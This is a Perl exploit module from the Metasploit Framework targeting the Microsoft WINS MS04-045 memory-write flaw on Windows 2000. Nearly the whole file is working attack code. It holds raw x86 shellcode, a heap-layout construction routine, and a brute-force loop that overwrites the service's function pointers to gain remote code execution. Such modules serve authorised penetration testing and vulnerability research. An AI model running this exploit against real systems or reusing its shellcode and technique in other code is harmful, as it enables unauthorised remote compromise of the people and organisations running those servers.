
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::wins_ms04_045;
use base "Msf::Exploit";
use Pex::DCERPC;
use strict;
use Pex::Utils;
use Pex::Text;

my $advanced = 
{
	'BASE'	=> [0, 'Specify the exact address to the structure'],
	'TARG'	=> [0, 'Specify the exact address to overwrite'],
	'WHAT'	=> [0, 'Specify the data used to overwrite the address'],
	'INT3'	=> [0, 'Switch to a payload of x86 debug interrupts'],
};

my $info =
{
    'Name'  => 'Microsoft WINS MSO4-045 Code Execution',
    'Version'  => '$Revision$',
    'Authors' => [ 'H D Moore <hdm [at] metasploit.com>' ],
    'Arch'  => [ 'x86' ],
    'OS'    => [ 'win32', 'win2000' ],
    'Priv'  => 1,
    'AutoOpts'  => { 'EXITFUNC' => 'process' },
    'UserOpts'  => {
                    'RHOST'  => [1, 'ADDR', 'The target address'],
                    'RPORT'  => [1, 'PORT', 'The target port', 42],
                },

    'Payload' => {
                     'Space'  => 4000,
                     'BadChars'  => '',
					 'Keys'      => ['+ws2ord'],
					 
					 'PrependEncoder' =>			 
						# Patch up the WSApSetPostRoutine stub...
						"\x60\xb8\x00\x0f\x02\x00\x8b\x10\xb9\x1e\xeb\xfe\x00\x39\xca\x75".
						"\x04\x61\xc2\x08\x00\x89\x08\xcc".
						# Unload ws2_32.dll....
						"\xfc\xe8\x4c\x00\x00\x00\x60\x8b\x6c\x24\x28\x8b\x45\x3c\x8b\x7c".
						"\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\xe3\x30\x49\x8b".
						"\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01".
						"\xc2\xeb\xf4\x3b\x54\x24\x24\x75\xe3\x8b\x5f\x24\x01\xeb\x66\x8b".
						"\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61\xc2".
						"\x08\x00\x6a\x30\x59\x64\x8b\x31\x8b\x76\x0c\x8b\x76\x1c\xad\x8b".
						"\x58\x08\x5e\x53\x68\x8e\x4e\x0e\xec\xff\xd6\x97\xe8\x07\x00\x00".
						"\x00\x57\x53\x32\x5f\x33\x32\x00\xff\xd7\x89\xc7\x53\x68\xa0\xd5".
						"\xc9\x4d\xff\xd6\x89\xc3\x6a\x10\x59\x51\x57\xff\xd3\x59\xe2\xf9",
                 },
    
    'Description'  => Pex::Text::Freeform(qq{
        This module exploits a arbitrary memory write flaw in the WINS service, this vulnerability
        was originally found by Immunity.
    }),
                
    'Refs'  =>   [  
                 #   ['OSVDB',   5248],
                    ['MSB',     'MS04-045'],
                 ],
    'Targets'   =>
                 [
                   ['Windows 2000 FnTable Brute', 0x05391eac],
                 ],
    'Keys'  =>  ['wins'],                 
};

sub new {
  my $class = shift;
  my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);
  return($self);
}

# SP4=05371ef8 - "\xa4\xff\x3d\x05\x91\x81\xf9\x77\x40\x96\xf8\x77"
# SP4=05371e90 - "\xa4\xff\x3d\x05\x91\x81\xf9\x77\x40\x96\xf8\x77

# SP0=05371e90 - "\xa4\xff\x3d\x05\xdb\x80\xfb\x77\x78\xae\xf8\x77"

# SP1=05371e90 - "\xa4\xff\x80\x05\x45\x90\xfb\x77\x70\x1f\xf8\x77"

# SP2=05371e90 - "\xa4\xff\x3d\x05\xa7\x9d\xfb\x77\x80\x26\xf8\x77"
# SP2=05371ef8 - "\xa4\xff\x3d\x05\xa7\x9d\xfb\x77\x80\x26\xf8\x77

# SP3=05371e90 - "\xa4\xff\x3d\x05\x95\x2b\xf8\x77\x08\x36\xf8\x77"
# SP3=05372238 - "\xa4\xff\x3d\x05\x95\x2b\xf8\x77\x08\x36\xf8\x77"


# ???=00000039 - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=00000040 - "\x01\x00\x00\x00\x01\x00\x00\x00\x48\x00\x00\x00"
# ???=02171dd0 - "\x48\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00"
# ???=0000003e - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=0000003e - "\xa4\xff\x41\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=0000003d - "\xa4\xff\x41\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=02671dd0 - "\x48\x00\x00\x00\x09\x00\x00\x00\xbb\x03\x00\x00"
# ???=00000040 - "\x84\xf5\x33\x04\x25\x3c\x01\x01\xc0\x01\x00\x00"
# ???=0000003f - "\x84\xf5\x4a\x05\x35\x3c\x01\x01\xac\x01\x00\x00"
# ???=00000040 - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=00000040 - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=0000003a - "\x84\xf5\x73\x03\x35\x3c\x01\x01\xb4\x03\x00\x00"
# ???=05371ef8 - "\xa4\xff\x41\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=05372030 - "\xa4\xff\x41\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"
# ???=0000003f - "\xa4\xff\x3d\x05\x55\x1f\xf8\x77\x18\x25\xf8\x77"

sub Check {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');	
	
	my $req = 
		"\x00\x00\x00\x29\x00\x00\x78\x00\x00\x00\x00\x00".
		"\x00\x00\x00\x00\x00\x00\x00\x40\x00\x02\x00\x05".
		"\x00\x00\x00\x00\x60\x56\x02\x01\x00\x1F\x6E\x03".
		"\x00\x1F\x6E\x03\x08\xFE\x66\x03\x00";
		
	my $s = Msf::Socket::Tcp->new
	(
		'PeerAddr'  => $target_host,
		'PeerPort'  => $target_port,
	);

	if ($s->IsError) {
		$self->PrintLine("[*] Socket error: " . $s->GetError());
		return $self->CheckCode('Connect');
	}

	$s->Send($req);	
	my $res = $s->Recv(-1, 5);
	
	printf( "PTR: %.8x\n", unpack('N', substr($res, 16, 4)));
	
	print Pex::Text::BufferPerl($res);

}

sub Replicate {
	my $self = shift;
	my $targ = shift;
	my $what = shift;

	# alignment magic only allows 8 bytes of contiguous data
	my $data = pack('V10',
		0x41414141,
		$what,
		$targ - 0x48,
		$what,
		$what,
		0x33333333,
		0x43434343,
		0x44444444,
		0x45454545,
		0x46464646,
	);
	
	return $data;
}

#		0x41414141,
#		$what,
#		$targ - 0x48,
#		$what,
#		$what,
#		0x33333333,
#		0x43434343,
##		0x44444444,
#		0x45454545,
#		0x46464646,

# alternative - results in where to what :/
#	my $data = pack('V10',
#		$what,			# D
#		$what,			# A
#		$targ - 0x48,	# B 
#		$what,			# C
#		$what,			# D
#		0x41414141,
#		0x42424242,
#		$what,			# A
#		$targ - 0x48,	# B
#		$what,			# C
#	);

sub Exploit {
    my $self = shift;
    my $target_host = $self->GetVar('RHOST');
    my $target_port = $self->GetVar('RPORT');
    my $target_idx  = $self->GetVar('TARGET');
    
    my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
    
    my $target = $self->Targets->[$target_idx];
   
    if (! $self->InitNops(128)) {
	    $self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}
	
	my $base = $target->[1];
	my $boom = $base + 44000;
	my $req;
	
	my @targets;

	$self->PrintLine(sprintf("[*] Using target return address of 0x%.8x", $boom));

	# Contiguous target ranges need to be in descending order...
	
	# Since these functions can be called at any time, write down the entire
	# table as fast as we can, to prevent the payload pointer from being used
	# as the where address (ie. corrupt our payload).


	push @targets, 0x750417c4; #SP4
	push @targets, 0x750417ac; #SP0
	push @targets, 0x750417c4; #SP1
	push @targets, 0x750407c4; #SP2
	push @targets, 0x750417c4; #SP4	
	
	
	# wins.exe function table (SP0 -> SP3)
	for (my $start = 0x500; $start >= 0x100; $start -= 8) {
	#	push @targets, 0x1025000 + $start;

	}
	
	# wins.exe function table (SP4)
	for (my $start = 0x500; $start >= 0x100; $start -= 8) {
	#	push @targets, 0x1024000 + $start;	
	}

	# ws2_32 pointers (too dangerous to use, but work for non-winsock shellcode)
	#push @targets, 0x750417ac; #SP0
	#push @targets, 0x750417c4; #SP1
	#push @targets, 0x750407c4; #SP2
	#push @targets, 0x750417c4; #SP4
		
	
	# Fake target needed to supply what address of last target in the chain
	push @targets, 0xd00df00d;



	# Each valid base pointer, but invalid structure, results in a new structure
	# being added to the base pointer. These structures are 40 bytes long. 
	
	# We can guarantee that our data will always be aligned at 40 byte boundaries,
	# so we generate a set of structures that wrap into each other and will always
	# have (40 * count) + 4 pointing to the where pointer. 	
	
	##
	# Step 1
	# ======
	#
	# Pad the beginning of the request with 200 40-byte structures with benign data.
	# This will let us attack a server that has already had the base address grown
	# by up to 100 structures.
	#
	##
	
	# Prevent the base from growing by using a valid address
	# 0x20000 = global process information segment
	$req = $self->Replicate(0x00020fe4 - 4, unpack('V', 'MSF!')) x 200;
	
	# This should always point at the first where address in the padding buffer
	my $brute_base = $base + (199 * 40) + 4;
	# XXX 100 == production

	$self->PrintLine(sprintf("[*] The bruteforce base address is 0x%.8x", $brute_base));
		
	##
	# Step 2
	# ======
	#
	# Assume that our data starts at BASE + 100 * 40. This should always be the case
	# as long less than 100 exceptions have already occured in the wins.exe process.
	# Create structures that will iterate thorugh all of the target addreses. We will
	# later scan through these structures with additional requests.
	#
	##	
	
	# Iterate through all target addresses, adding a structure to the request for
	# each one of them. Since the first eight bytes of the target address will be
	# overwritten by a dword and then the next target address, we will write to 
	# eight bytes before the target and only increment by eight byte chunks. 
	
	foreach my $targ (@targets) {
		$req .= $self->Replicate($targ - 8, $boom);
	}


	##
	# Step 3
	# ======
	#
	# Determine how much space is left to fill between the bruteforce structures and
	# the beginning of the payload itself. Fill in this data and then append as many
	# bytes of nops as we account for in padding structures. Finally, append our 
	# payload to the end of these nops.
	#
	##


	my $diff = 40000 - length($req);

	if ($diff <= 0) {
		$self->PrintLine("[*] Internal error, bruteforce buffer is too large.");
		return;
	}

	$req .= "\xcc" x $diff;
	$req .= $self->MakeNops(100 * 40);
	$req .= $shellcode;
	$req .= ("END!" x 256);

	
	##
	# Step 4
	# ======
	#
	# Place our request into memory, using an invalid structure pointer.
	#
	##		
	
	my $pkt = pack('NNN', length($req) - 8, -1, 0xdeadface). $req;
	$self->PrintLine("[*] Initializing the attack...");
	my $s = Msf::Socket::Tcp->new
    (
        'PeerAddr'  => $target_host,
        'PeerPort'  => $target_port,
    );

    if ($s->IsError) {
        $self->PrintLine("[*] Socket error: " . $s->GetError());
        return(0);
    }

	$s->Send($pkt);



	##
	# Step 5
	# ======
	#
	# Bruteforce through our structure list, starting at the heap base plus the padding
	# offset, plus 4. Increment this pointer by 40 bytes until we run out of addresses
	# or we get a shell. 
	#
	##		
		
	my $brute = $brute_base;
	my $brute_max = $brute_base + (100 * 40) + (scalar(@targets) * 40) + 4000;
	
	$self->PrintLine("[*] Starting bruteforce, this can take a few minutes...");
	
	while ($brute < $brute_max)
	{

		my $pkt = pack('NNN', 8, -1, $brute);
		
		$self->PrintLine(sprintf("[*] Targeting structure at 0x%.8x of 0x%.8x...", $brute, $brute_max));

		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);

    	if ($s->IsError) {
        	$self->PrintLine("[*] Socket error: " . $s->GetError());
			sleep(1);
			next;
    	}

		$s->Send($pkt);	
		$brute += 40;
		select(undef, undef, undef, 0.10);
	}



	##
	# Step 6
	# ======
	#
	# The function table has been completely overwritten by this point, however we still
	# need to wait for one of these functions to be called. Sadly, I have yet to figure out
	# how to trigger these besides just waiting around and knocking on the service for a
	# minute or two...
	#
	##		
		
	$self->PrintLine("[*] Waiting for function pointer to be called (3 minutes max)...");
	for (1 .. 18) {
		my $s = Msf::Socket::Tcp->new
    	(
        	'PeerAddr'  => $target_host,
        	'PeerPort'  => $target_port,
    	);
		$s->Send(pack('NNN', 8, -1, 0xdeadbeef));
		sleep(10);
		$s->Close;
	}

	$self->PrintLine("[*] Exploit failed, ");
	return;
}


1;

